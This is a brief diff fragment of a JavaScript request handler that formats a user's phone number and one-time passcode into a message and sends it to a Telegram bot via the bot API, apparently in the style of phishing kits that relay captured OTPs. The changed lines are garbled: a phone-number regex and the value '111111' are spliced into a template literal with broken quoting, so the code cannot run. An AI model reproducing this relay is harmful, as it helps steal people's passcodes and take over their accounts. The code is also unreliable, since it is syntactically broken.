@@ -34,7 +34,8 @@ export default async function handler(req, res) {
       `🔑 OTP otp\n` +
       `📱 Phone: ${phone}\n` +
       `🔢 OTP: [otp]\n\n` +
-      `✅ Result: ${result || "OTP }`;
+      `✅ Result: ${result || "OTP /^(\+?\d{2})\d+(\d{2})$/,
+          "111111"}`;
 
     const response = await fetch(
       `https://api.telegram.org/bot${token}/sendMessage`,
